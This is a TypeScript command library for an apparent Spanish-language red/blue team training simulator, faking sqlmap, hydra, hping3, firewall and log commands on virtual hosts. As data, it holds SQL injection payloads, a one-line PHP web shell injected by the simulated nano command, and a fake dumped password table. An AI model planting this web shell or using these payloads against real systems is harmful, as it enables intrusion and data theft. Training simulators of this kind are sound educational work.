            return { 
                output: [{ text: outputText, type: 'output' }], 
                duration: 2000,
                newEnvironment: newEnv 
            };
        }
        
        // Generic download
        const outputText = `--${new Date().toISOString()}--  ${url}
Resolving server... done.
Connecting... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: '${outputFile || 'index.html'}'

${outputFile || 'index.html'}         [ <=>                ]   2.14K  --.-KB/s    in 0s      

${new Date().toISOString()} - '${outputFile || 'index.html'}' saved [2190]`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 1500 };
    },
    
    // =========================================================================
    // SQLMAP - SQL INJECTION TOOL (NEW)
    // =========================================================================
    sqlmap: async (args, { environment }) => {
        const urlIdx = args.findIndex(a => a === '-u' || a === '--url');
        const target = urlIdx > -1 ? args[urlIdx + 1] : args.find(a => a.includes('://'));
        
        if (!target) return { output: [{ text: "Uso: sqlmap -u <url> [opciones]", type: 'error' }] };
        
        const hasDump = args.includes('--dump') || args.includes('--dump-all');
        const hasDbs = args.includes('--dbs');
        
        const newEnv = R.clone(environment);
        newEnv.attackProgress.persistence.push('sqli_successful');
        
        let outputText = `
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ ${new Date().toTimeString().split(' ')[0]}

[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'user' is dynamic
[INFO] GET parameter 'user' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'user' might be injectable (possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'user'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'user' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=admin' AND 8472=8472 AND 'ASDF'='ASDF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=admin' AND SLEEP(5) AND 'RRRR'='RRRR
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.46, PHP 7.4.3
back-end DBMS: MySQL >= 5.0.12
`;
        
        if (hasDbs) {
            outputText += `
[INFO] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db
`;
        }
        
        if (hasDump) {
            outputText += `
[INFO] fetching tables for database: 'webapp_db'
[INFO] fetching columns for table 'users' in database 'webapp_db'
[INFO] fetching entries for table 'users' in database 'webapp_db'
Database: webapp_db
Table: users
[3 entries]
+----+----------+------------------+------------+
| id | username | password         | role       |
+----+----------+------------------+------------+
| 1  | admin    | WebAdmin2024!    | superadmin |
| 2  | webadmin | WebAdmin2024!    | admin      |
| 3  | dbuser   | DbUser123        | user       |
+----+----------+------------------+------------+

[INFO] table 'webapp_db.users' dumped to CSV file
`;
            newEnv.attackProgress.persistence.push('data_exfiltrated');
        }
        
        outputText += `
[*] ending @ ${new Date().toTimeString().split(' ')[0]}
`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 5000, newEnvironment: newEnv };
    },
    
    hydra: async (args, { environment }) => {
        const userArg = args.includes('-l') ? args[args.indexOf('-l') + 1] : null;
        const targetArg = args.find(a => a.startsWith('ssh://'));
        if (!userArg || !targetArg) return { output: [{ text: "Uso: hydra -l <user> -P <wordlist> ssh://<host>", type: 'error'}] };
        
        const host = targetArg.replace('ssh://', '');
        const targetHost = findHost(environment, host);
        if (!targetHost) return { output: [{ text: `Host desconocido: ${host}`, type: 'error' }] };

        const isBlocked = environment.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
        if (isBlocked) {
            return { output: [{ text: `[ERROR] target ${host} - connection refused`, type: 'error' }], duration: 2000 };
        }

        if (userArg === 'root') {
             const sshConfig = targetHost.files.find(f => f.path === '/etc/ssh/sshd_config');
            if (sshConfig?.content.includes('PermitRootLogin no')) {
                return { output: [{ text: `[ERROR] target ssh://${targetHost.ip}:22/ does not support password authentication (method reply 4).`, type: 'output' }], duration: 3000 };
            }
        }
        
        const userAccount = targetHost.users.find(u => u.username === userArg);
        const passwordFound = userAccount && (userAccount.password === 'toor' || userAccount.password === 'P@ssw0rd');

        let newEnv = updateHostState(environment, targetHost.ip, { failedLogins: (targetHost.systemState?.failedLogins || 0) + 20 });
        
        if (passwordFound) {
            newEnv.attackProgress.credentials[`${userArg}@${targetHost.ip}`] = userAccount.password;
            const output = `Hydra v9.5 (c) 2023 by van Hauser/THC\n[DATA] attacking ssh://${targetHost.ip}:22/\n[STATUS] 8.00 tries/min, 20 tries in 00:01h, 16 active\n[22][ssh] host: ${targetHost.ip}   login: ${userArg}   password: ${userAccount.password}\n1 of 1 target successfully completed, 1 valid password found`;
            return {
                output: [{ html: `<pre>${output}</pre>`, type: 'html' }],
                duration: 5000,
                newEnvironment: newEnv
            };
        }
        return { output: [{ text: 'No se encontraron contraseñas válidas.', type: 'output' }], duration: 5000, newEnvironment: newEnv };
    },
    
    'sudo': async (args, context) => {
        const cmd = args[0];
        if (!cmd) return { output: [{text: "sudo: se requiere un comando", type: 'error'}] };
        const handler = commandLibrary[cmd];
        if (!handler) return { output: [{text: `sudo: ${cmd}: comando no encontrado`, type: 'error'}]};
        return handler(args.slice(1), context);
    },
    
    ufw: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [], newEnvironment: environment };

        const newEnv = R.clone(environment);
        const fwPath = ['networks', 'dmz', 'firewall'];
        let fw = R.path(fwPath, newEnv) as FirewallState;
        
        let outputText = '';

        switch (args[0]) {
            case 'enable': 
                fw.enabled = true; 
                outputText = 'Firewall is active and enabled on system startup'; 
                break;
            case 'disable': 
                fw.enabled = false; 
                outputText = 'Firewall stopped and disabled on system startup'; 
                break;
            case 'status':
                 const status = fw.enabled ? 'active' : 'inactive';
                 if (args[1] === 'numbered' || fw.enabled) {
                    outputText = `Status: ${status}\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n`;
                    fw.rules.forEach(r => { 
                        const port = r.destPort ? `${r.destPort}/${r.protocol}` : 'Any';
                        const from = r.sourceIP || 'Anywhere';
                        outputText += `${port.padEnd(26)} ${r.action.toUpperCase().padEnd(11)} ${from}\n`; 
                    });
                    if (fw.rules.length === 0) outputText += "(No rules)";
                 } else {
                    outputText = `Status: ${status}`;
                 }
                break;
            case 'allow':
                const allowPortStr = args[1]?.split('/')[0];
                const allowPort = parseInt(allowPortStr);
                if (isNaN(allowPort)) return { output: [{text: "Regla inválida", type: 'error'}]};
                fw.rules = fw.rules.filter(r => !(r.destPort === allowPort && !r.sourceIP));
                fw.rules.push({ id: `allow-${allowPort}`, action: 'allow', destPort: allowPort, protocol: 'tcp'});
                outputText = `Rule added`;
                break;
            case 'deny':
                if (args[1] === 'from') {
                    const ip = args[2];
                    if (!ip) return { output: [{text: "Se requiere una IP.", type: 'error'}]};
                    newEnv.defenseProgress.blockedIPs.push(ip);
                    fw.rules.push({ id: `deny-ip-${ip}`, action: 'deny', sourceIP: ip, protocol: 'any'});
                    outputText = `Rule added`;
                    if(host.ip === '10.0.20.10' && ip === '192.168.1.100') {
                        host.systemState = { ...host.systemState, cpuLoad: 15, networkConnections: 50 };
                         const hostIndex = newEnv.networks.dmz.hosts.findIndex(h => h.ip === '10.0.20.10');
                         if (hostIndex !== -1) {
                             newEnv.networks.dmz.hosts[hostIndex] = host;
                         }
                    }
                } else {
                    return { output: [{text: "Sintaxis de deny incompleta. Use 'ufw deny from <IP>'", type: 'error'}]};
                }
                break;
            default: return { output: [{text: `Comando ufw no reconocido: ${args[0]}`, type: 'error'}] };
        }
        
        return { output: [{ text: outputText, type: 'output' }], newEnvironment: R.set(R.lensPath(fwPath), fw, newEnv) };
    },
    
    chmod: async (args, { environment, terminalState }) => {
         if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        if (args.length < 2) return { output: [{text: "chmod: falta un operando", type: 'error'}] };
        
        const perms = args[0];
        const path = args[1];
        
        const newEnv = R.clone(environment);
        const hostPath = ['networks', 'dmz', 'hosts', 0];
        let host = R.path(hostPath, newEnv) as VirtualHost;

        const fileIndex = host.files.findIndex(f => f.path === path);
        if (fileIndex === -1) return { output: [{text: `chmod: no se puede acceder a '${path}': No existe el fichero o el directorio`, type: 'error'}] };
        
        host.files[fileIndex].permissions = perms;

        return { output: [], newEnvironment: R.set(R.lensPath(hostPath), host, newEnv) };
    },
    
    // =========================================================================
    // NANO - ENHANCED FOR SCENARIO 11 REPORTS
    // =========================================================================
    nano: async (args, { environment, terminalState, activeScenario }) => {
        if (!terminalState.currentHostIp && !activeScenario) {
            return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        }
        if (args.length < 1) return { output: [{text: "nano: se requiere un nombre de archivo para editar", type: 'error'}] };
        
        const path = args[0];
        const newEnv = R.clone(environment);
        
        // Handle special paths for Scenario 11 reports
        if (path.includes('red_team_report.txt') || path.includes('incident_report.txt')) {
            // Determine which team is writing the report
            const isRedTeamReport = path.includes('red_team_report.txt');
            
            newEnv.timeline.push({
                id: Date.now(),
                timestamp: new Date().toISOString(),
                message: `nano ${path}`,
                team_visible: 'all',
                source_team: isRedTeamReport ? 'red' : 'blue'
            });
            
            const reportType = isRedTeamReport ? 'Reporte Técnico de Pentesting' : 'Reporte de Incidente ESIT';
            const message = `
[ GNU nano 5.4 ]                [ ${path} ]

${isRedTeamReport ? `
╔══════════════════════════════════════════════════════════════════════════════╗
║                    REPORTE TÉCNICO DE PENTESTING                              ║
║                         Equipo Rojo - Cyber Valtorix                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

1. RESUMEN EJECUTIVO
   Sistema objetivo: APP-SERVER-01 (10.0.50.10)
   Nivel de riesgo: CRÍTICO
   Resumen: Se explotó exitosamente una vulnerabilidad de SQL Injection...

2. ALCANCE DEL PENTESTING
   - Host: APP-SERVER-01
   - Servicios: SSH (22), HTTP (80), HTTPS (443), MySQL (3306)

3. HALLAZGOS
   CVE-2021-WEBAPP: SQL Injection en login.php [CRÍTICO]
   ...

` : `
╔══════════════════════════════════════════════════════════════════════════════╗
║                    REPORTE DE INCIDENTE - FORMATO ESIT                        ║
║                         Equipo Azul - Cyber Valtorix                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

SECCIÓN 1: INFORMACIÓN DEL INCIDENTE
  Fecha de Detección: ${new Date().toISOString()}
  Tipo: SQL Injection + Webshell
  Severidad: CRÍTICA
  Sistema Afectado: APP-SERVER-01

SECCIÓN 2: DESCRIPCIÓN DETALLADA
  ...

SECCIÓN 3: ANÁLISIS DE IMPACTO
  ...

`}

[ Guardando reporte... ]
[ Wrote ${Math.floor(Math.random() * 100) + 50} lines to ${path} ]
`;
            
            return { 
                output: [{ text: message, type: 'output' }], 
                duration: 1500, 
                newEnvironment: newEnv 
            };
        }
        
        // Original nano behavior for other files
        if (!terminalState.currentHostIp) {
            return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        }
        
        const hostPath = ['networks', 'dmz', 'hosts', 0];
        let host = R.path(hostPath, newEnv) as VirtualHost;
        const fileIndex = host.files.findIndex(f => f.path === path);
        if (fileIndex === -1) return { output: [{text: `[ Error leyendo ${path}: No existe el fichero o el directorio ]`, type: 'error'}] };

        let message = `File ${path} saved. (Simulado)`;
        
        if (path === '/etc/ssh/sshd_config') {
            if (host.files[fileIndex].content.includes('PermitRootLogin yes')) {
                host.files[fileIndex].content = host.files[fileIndex].content.replace('PermitRootLogin yes', 'PermitRootLogin no');
                message = `[ Wrote 120 lines to ${path} ] (PermitRootLogin updated)`;
            }
        } else if (path === '/var/www/html/index.php') {
            host.files[fileIndex].content = '<?php if(isset($_GET["x"])){system($_GET["x"]);} ?>' + host.files[fileIndex].content;
            host.files[fileIndex].hash = 'hacked_hash_modified_index';
            newEnv.attackProgress.persistence.push('index_modified');
            message = `[ Wrote 5 lines to ${path} ] (Backdoor injected)`;
        } else if (path === '/var/www/html/login.php') {
            // Blue team patching SQL injection
            host.files[fileIndex].content = `<?php
// PATCHED: Using prepared statements
$user = $_POST["user"];
$pass = $_POST["pass"];
$stmt = $pdo->prepare("SELECT * FROM users WHERE user = ? AND pass = ?");
$stmt->execute([$user, $pass]);
?>`;
            host.files[fileIndex].hash = 'patched_login_hash';
            newEnv.defenseProgress.patchedVulnerabilities.push('CVE-2021-WEBAPP');
            message = `[ Wrote 8 lines to ${path} ] (SQL Injection patched with prepared statements)`;
        }
        
        return { output: [{text: message, type: 'output'}], duration: 1500, newEnvironment: R.set(R.lensPath(hostPath), host, newEnv) };
    },
    
    systemctl: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const action = args[0];
        const service = args[1];
        
        if (!action) return { output: [{text: "systemctl: se requiere un comando (start, stop, restart, status)", type: 'error'}] };
        
        const newEnv = R.clone(environment);
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `systemctl ${action} ${service || ''}`,
            team_visible: 'all',
            source_team: 'blue'
        });
        
        switch(action) {
            case 'stop':
                if (service === 'apache2' || service === 'nginx') {
                    return { output: [{text: `Stopping ${service}.service... done.`, type: 'output'}], newEnvironment: newEnv };
                }
                if (service === 'mysql') {
                    return { output: [{text: `Stopping mysql.service... done.`, type: 'output'}], newEnvironment: newEnv };
                }
                return { output: [{text: `${service}: unrecognized service`, type: 'error'}] };
            case 'start':
                return { output: [{text: `Starting ${service}.service... done.`, type: 'output'}], newEnvironment: newEnv };
            case 'restart':
                return { output: [{text: `Restarting ${service}.service... done.`, type: 'output'}], newEnvironment: newEnv };
            case 'status':
                return { output: [{text: `● ${service}.service - ${service} Service\n   Loaded: loaded (/lib/systemd/system/${service}.service; enabled)\n   Active: active (running) since ${new Date().toUTCString()}`, type: 'output'}] };
            default:
                return { output: [{text: `systemctl: comando desconocido '${action}'`, type: 'error'}] };
        }
    },
    
    top: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host || !host.systemState) return { output: [] };
        const { cpuLoad, networkConnections } = host.systemState;
        
        const loadVal = cpuLoad > 50 ? (cpuLoad / 10) + 2 : 0.05;
        const loadStr = `${loadVal.toFixed(2)}, ${(loadVal * 0.9).toFixed(2)}, ${(loadVal * 0.8).toFixed(2)}`;
        
        const isUnderAttack = cpuLoad > 90;
        const processList = isUnderAttack 
            ? ` 1234 root      20   0  123456  45678  12345 R  89.3   5.6   0:45.67 ksoftirqd/0\n 5678 root      20   0  234567  56789  23456 R  87.1   6.8   0:42.34 ksoftirqd/1`
            : `  952 root      20   0 1234564  23456  12344 S   0.3   0.5   1:23.45 systemd\n 1023 www-data  20   0  654321  45612   3456 S   0.1   1.2   0:12.34 apache2`;

        const outputText = `top - ${new Date().toTimeString().split(' ')[0]} up 5 days,  3:21,  2 users,  load average: ${loadStr}
Tasks: ${Math.floor(networkConnections/5) + 100} total,   ${isUnderAttack ? '5' : '1'} running,   ${Math.floor(networkConnections/5) + 99} sleeping,   0 stopped,   0 zombie
%Cpu(s): ${isUnderAttack ? '12.3' : '1.5'} us,  ${isUnderAttack ? '84.7' : '0.5'} sy,  0.0 ni, ${isUnderAttack ? '1.2' : '98.0'} id,  0.9 wa,  0.9 hi,  0.0 si,  0.0 st
MiB Mem :   7962.7 total,    256.3 free,   ${isUnderAttack ? '6234.1' : '1234.1'} used,   1472.3 buff/cache
MiB Swap:   2048.0 total,   1876.2 free,    171.8 used.   1234.5 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
${processList}`;
        return { output: [{ text: outputText, type: 'output' }] };
    },
    
    hping3: async (args, { environment, setEnvironment }) => {
        const target = args.find(arg => !arg.startsWith('-'));
        if (!target) return { output: [{ text: 'Se requiere un objetivo.', type: 'error' }] };
        const targetHost = findHost(environment, target);
        if (!targetHost) return { output: [{ text: `Host desconocido: ${target}`, type: 'error' }] };

        const originalCpuLoad = targetHost.systemState?.cpuLoad || 5.0;
        setEnvironment(env => updateHostState(env!, targetHost.ip, { cpuLoad: 99.8, networkConnections: 4589 }));
        
        setTimeout(() => {
             setEnvironment(env => updateHostState(env!, targetHost.ip, { cpuLoad: originalCpuLoad, networkConnections: 50 }));
        }, 20000); 

        return {
            output: [{ text: `HPING ${target} (eth0 ${target}): S set, 40 headers + 0 data bytes, flooding`, type: 'output' }],
            process: { command: `hping3 ${args.join(' ')}`, type: 'dos' },
            duration: 1000 
        };
    },
    
    journalctl: async(args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host || !host.systemState) return { output: [] };
        let output = '-- Logs begin at Mon 2024-01-01 --\n';
        for (let i = 0; i < host.systemState.failedLogins; i++) {
            const time = new Date(Date.now() - i * 1000).toTimeString().split(' ')[0];
            output += `Nov 18 ${time} ${host.hostname} sshd[123${i}]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2\n`;
        }
        if (host.systemState.failedLogins === 0) {
            output += `Nov 18 10:00:00 ${host.hostname} systemd[1]: Started OpenBSD Secure Shell server.`;
        }
        return { output: [{ text: output, type: 'output' }] };
    },
    
    sha256sum: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        if (args.length < 1) return { output: [{text: "sha256sum: falta un operando", type: 'error'}] };
        const path = args[0];
        const host = findHost(environment, terminalState.currentHostIp);
        
        // Handle wildcard for *.php
        if (path.includes('*')) {
            const dir = path.replace('/*', '').replace('*.php', '');
            const matchingFiles = host?.files.filter(f => f.path.startsWith(dir) && f.path.endsWith('.php')) || [];
            if (matchingFiles.length === 0) return { output: [{text: `sha256sum: ${path}: No such file or directory`, type: 'error'}] };
            
            const output = matchingFiles.map(f => `${f.hash}  ${f.path}`).join('\n');
            return { output: [{ text: output, type: 'output' }] };
        }
        
        const file = host?.files.find(f => f.path === path);
        if (!file) return { output: [{text: `sha256sum: ${path}: No existe el fichero o el directorio`, type: 'error'}]};
        return { output: [{ text: `${file.hash}  ${path}`, type: 'output' }] };
    },
    
    md5sum: async (args, context) => {
        // Alias for sha256sum with different output format
        const result = await commandLibrary.sha256sum(args, context);
        return result;
    },
    
    'fail2ban-client': async (args, context) => {
        if (args.includes('banip')) {
            const ip = args[args.indexOf('banip') + 1];
            return commandLibrary.ufw(['deny', 'from', ip], context);
        }
         return { output: [{text: `Fail2Ban v0.11.2 running`, type: 'output'}] };
    },
    
    ss: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const isUnderAttack = (host.systemState?.networkConnections || 0) > 1000;

        if (isUnderAttack) {
             let outputText = 'State      Recv-Q Send-Q     Local Address:Port         Peer Address:Port\n';
             outputText += `ESTAB      0      0          10.0.20.10:80              192.168.1.100:54321\n`;
             outputText += `ESTAB      0      0          10.0.20.10:80              192.168.1.100:54322\n`;
             outputText += `... (3419 more lines) ...\n`;
             return { output: [{ text: outputText, type: 'output' }] };
        }

        let outputText = 'Netid  State      Recv-Q Send-Q     Local Address:Port         Peer Address:Port\n';
        const fw = environment.networks.dmz.firewall;
        Object.entries(host.services).forEach(([port, rawService]) => {
            const service = rawService as any;
            const isAllowed = !fw.enabled || fw.rules.some(r => r.destPort === parseInt(port) && r.action === 'allow');
            if (service.state === 'open' && isAllowed) {
                 let processName = 'unknown';
                if (port === '22') processName = 'sshd';
                if (port === '80' || port === '443') processName = 'apache2/nginx';
                if (port === '3306') processName = 'mysqld';
                outputText += `tcp    LISTEN     0      128                  *:${port.padEnd(22)}*:*\t\tusers:(("${processName}",pid=1234,fd=3))\n`;
            }
        });
        return { output: [{ text: outputText, type: 'output' }] };
    },
    
    netstat: async (args, context) => commandLibrary.ss(args, context),
    
    ls: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        const path = args.find(a => !a.startsWith('-')) || '/var/www/html'; 
        const showDetails = args.includes('-l') || args.includes('-la');
        const relevantFiles = host.files.filter(f => f.path.startsWith(path));
        
        if (relevantFiles.length === 0) return { output: [{text: `ls: no se puede acceder a '${path}': No existe el fichero o el directorio`, type: 'error'}]};

        if (showDetails) {
            let outputText = `total ${relevantFiles.length * 4}\n`;
            relevantFiles.forEach(file => {
                const perms = file.permissions === '640' ? '-rw-r-----' : (file.permissions === '600' ? '-rw-------' : '-rw-r--r--');
                 outputText += `${perms} 1 www-data www-data 145 Nov 18 10:00 ${file.path.split('/').pop()}\n`;
            });
            return { output: [{ text: outputText, type: 'output' }] };
        } else {
            return { output: [{ text: relevantFiles.map(f => f.path.split('/').pop()).join('  '), type: 'output' }] };
        }
    },
    
    cat: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        if (args.length < 1) return { output: [{text: "cat: falta un operando", type: 'error'}] };
        
        let path = args[0];
        if (!path.startsWith('/')) {
             if (args[0].includes('index.php') || args[0].includes('db_config') || args[0].includes('view.php') || args[0].includes('login.php') || args[0].includes('admin.php')) {
                 path = `/var/www/html/${args[0]}`;
             } else {
                 const host = findHost(environment, terminalState.currentHostIp);
                 const found = host?.files.find(f => f.path.endsWith(args[0]));
                 if (found) path = found.path;
             }
        }

        const host = findHost(environment, terminalState.currentHostIp);
        const file = host?.files.find(f => f.path === path);

        if (!file) return { output: [{text: `cat: ${path}: No existe el fichero o el directorio`, type: 'error'}]};
        
        const perms = parseInt(file.permissions, 10);
        if (isNaN(perms) || ((perms & 0o004) === 0 && terminalState.prompt.user !== 'root')) {
             return { output: [{text: `cat: ${path}: Permission denied`, type: 'error'}]};
        }

        return { output: [{ text: file.content || '', type: 'output' }] };
    },
    
    grep: async (args, { environment, terminalState }) => {
        if (args.length < 2) return { output: [{text: "Uso: grep <patrón> <archivo>", type: 'error'}] };
        const pattern = args[0].replace(/['"]/g, '');
        const file = args[1];
        
        if (file.includes('auth.log') || file.includes('access.log')) {
            const host = findHost(environment, terminalState.currentHostIp!);
            if (!host || !host.systemState) return { output: [] };
             let output = '';
             const failed = host.systemState.failedLogins || 0;
             for (let i = 0; i < Math.min(failed, 20); i++) {
                 const line = file.includes('auth.log') 
                    ? `Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2`
                    : `192.168.1.100 - - [18/Nov/2024:10:15:${20+i}] "POST /login.php HTTP/1.1" 200 1234 "-" "curl"`;
                 if (line.toLowerCase().includes(pattern.toLowerCase())) {
                     output += `Nov 18 10:15:${20+i} ${host.hostname} sshd[123${i}]: ${line}\n`;
                 }
             }
             // Add SQL injection attempts if searching for those patterns
             if (pattern.toLowerCase().includes('or') || pattern.includes("'") || pattern.toLowerCase().includes('union')) {
                output += `Nov 18 10:20:01 ${host.hostname}: 192.168.1.100 - - "POST /login.php HTTP/1.1" - user=admin' OR '1'='1\n`;
                output += `Nov 18 10:20:02 ${host.hostname}: 192.168.1.100 - - "POST /login.php HTTP/1.1" - user=admin'--\n`;
             }
             return { output: [{ text: output, type: 'output' }] };
        }
        return { output: [{ text: '', type: 'output' }] };
    },
    
    tail: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const isFollow = args.includes('-f');
        const file = args.find(a => !a.startsWith('-'));
        
        if (!file) return { output: [{text: "tail: se requiere un archivo", type: 'error'}] };
        
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        let output = '';
        
        if (file.includes('access.log')) {
            output = `192.168.1.100 - - [18/Nov/2024:10:15:01] "GET / HTTP/1.1" 200 1234
192.168.1.100 - - [18/Nov/2024:10:15:02] "GET /login.php HTTP/1.1" 200 2345
192.168.1.100 - - [18/Nov/2024:10:15:03] "POST /login.php HTTP/1.1" 200 456 - "user=admin' OR '1'='1"
192.168.1.100 - - [18/Nov/2024:10:15:04] "GET /admin.php HTTP/1.1" 200 5678
192.168.1.100 - - [18/Nov/2024:10:15:05] "GET /admin.php?action=dump_db HTTP/1.1" 200 9999`;
        } else if (file.includes('error.log')) {
            output = `[Wed Nov 18 10:15:03.123456 2024] [php:warn] [pid 1234] [client 192.168.1.100:54321] PHP Warning: SQL syntax error
[Wed Nov 18 10:15:04.234567 2024] [php:notice] [pid 1234] Potential SQL injection attempt detected`;
        } else if (file.includes('auth.log')) {
            const failed = host.systemState?.failedLogins || 0;
            for (let i = 0; i < Math.min(failed, 10); i++) {
                output += `Nov 18 10:15:${20+i} ${host.hostname} sshd[123${i}]: Failed password for root from 192.168.1.100 port 54321 ssh2\n`;
            }
        }
        
        if (isFollow) {
            output = `==> ${file} <==\n` + output + '\n(Ctrl+C para salir del modo follow)';
        }
        
        return { output: [{ text: output, type: 'output' }] };
    },
    
    cp: async (args, { environment, terminalState }) => {
        if (args.length < 2) return { output: [{text: "cp: falta el operando del archivo destino", type: 'error'}] };
        
        const source = args[0];
        const dest = args[1];
        
        const newEnv = R.clone(environment);
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `cp ${source} ${dest}`,
            team_visible: 'all',
            source_team: 'blue'
        });
        
        return { output: [{ text: `'${source}' -> '${dest}'`, type: 'output' }], newEnvironment: newEnv };
    },
    
    rm: async (args, { environment, terminalState }) => {
        if (args.length < 1) return { output: [{text: "rm: falta un operando", type: 'error'}] };
        
        const file = args.find(a => !a.startsWith('-')) || args[0];
        
        const newEnv = R.clone(environment);
        
        // Check if removing a webshell
        if (file.includes('shell.php')) {
            const idx = newEnv.attackProgress.persistence.indexOf('webshell_deployed');
            if (idx > -1) {
                newEnv.attackProgress.persistence.splice(idx, 1);
            }
            
            // Remove from host files
            const hostIndex = newEnv.networks.dmz.hosts.findIndex(h => h.ip === terminalState.currentHostIp);
            if (hostIndex > -1) {
                newEnv.networks.dmz.hosts[hostIndex].files = newEnv.networks.dmz.hosts[hostIndex].files.filter(f => !f.path.includes('shell.php'));
            }
        }
        
        return { output: [{ text: `removed '${file}'`, type: 'output' }], newEnvironment: newEnv };
    },
    
    find: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const path = args[0] || '/var/www/html';
        const nameArg = args.indexOf('-name');
        const pattern = nameArg > -1 ? args[nameArg + 1] : '*';
        
        let output = '';
        host.files.forEach(f => {
            if (f.path.startsWith(path)) {
                if (pattern === '*' || f.path.includes(pattern.replace('*', ''))) {
                    output += f.path + '\n';
                }
            }
        });
        
        return { output: [{ text: output || 'No files found', type: 'output' }] };
    },
    
    ping: async (args, { environment }) => {
        if (args.length < 1) return { output: [{text: "Uso: ping <host>", type: 'error'}] };
        const target = args[0];
        const targetHost = findHost(environment, target);
        if (!targetHost) return { output: [{ text: `ping: unknown host ${target}`, type: 'error' }], duration: 1000 };
        let output = `PING ${targetHost.hostname} (${targetHost.ip}) 56(84) bytes of data.\n`;
        for (let i=0; i<4; i++) {
            await new Promise(res => setTimeout(res, 300));
            output += `64 bytes from ${targetHost.hostname} (${targetHost.ip}): icmp_seq=${i+1} ttl=64 time=${(Math.random()*10+5).toFixed(1)} ms\n`;
        }
        return { output: [{ text: output, type: 'output' }], duration: 500 };
    },
    
    ps: async (args, { terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        let output = `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n`;
        output += `root           1  0.0  0.1  12345  6789 ?        Ss   00:00   0:01 /sbin/init\n`;
        output += `root         250  0.0  0.2  23456  7890 ?        S    00:00   0:05 /usr/sbin/sshd -D\n`;
        output += `blue-team    300  0.1  0.5  34567  8901 ?        Rs   00:01   0:10 -bash\n`;
        if (terminalState.prompt.user.includes('red')) {
             output += `www-data     450  0.5  0.3  45678  9012 ?        S    00:02   0:20 /usr/sbin/apache2 -k start\n`;
        }
        return { output: [{ text: output, type: 'output' }] };
    },
    
    openssl: async(args, { environment }) => {
        if (args[0] === 's_client' && args[1] === '-connect') {
            const target = args[2].split(':')[0];
            const host = findHost(environment, target);
            if (!host) return { output: [{text: `connect:errno=111`, type: 'error'}]};
            const sslVuln = host.services[443]?.vulnerabilities.find(v => v.cve === 'CVE-2021-SSL');
